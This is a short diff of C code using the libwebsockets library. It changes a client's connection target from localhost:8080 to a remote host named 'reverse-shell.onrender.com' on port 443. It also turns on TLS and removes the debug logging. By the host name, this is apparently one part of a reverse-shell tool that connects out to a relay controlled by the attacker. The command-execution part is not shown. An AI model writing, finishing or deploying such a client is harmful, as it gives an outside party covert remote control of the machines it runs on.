@@ -174,10 +174,10 @@ int establish_connection(){
     struct lws_context_creation_info info;
     struct lws_client_connect_info ccinfo;
     struct lws_context *context;
-    // const char *url = "reverse-shell.onrender.com";
-    // int port = 443;
-    const char *url = "localhost";
-    int port = 8080;
+    const char *url = "reverse-shell.onrender.com";
+    int port = 443;
+    // const char *url = "localhost";
+    // int port = 8080;
 
     memset(&info, 0, sizeof info);
     info.port = CONTEXT_PORT_NO_LISTEN;
@@ -186,9 +186,6 @@ int establish_connection(){
         {"chat", callback_echo, 0, 0},
         {NULL, NULL, 0, 0}
     };
-
-    // Enable debug logging
-    lws_set_log_level(LLL_USER | LLL_ERR | LLL_WARN | LLL_NOTICE | LLL_INFO | LLL_DEBUG, NULL);
 
     context = lws_create_context(&info);
     if (!context) {
@@ -204,7 +201,7 @@ int establish_connection(){
     ccinfo.host = url;
     ccinfo.origin = url;
     ccinfo.protocol = "chat";
-    //ccinfo.ssl_connection = LCCSCF_USE_SSL; // Enable SSL/TLS
+    ccinfo.ssl_connection = LCCSCF_USE_SSL; // Enable SSL/TLS
     ccinfo.pwsi = NULL;
 
     signal(SIGINT, sigint_handler);
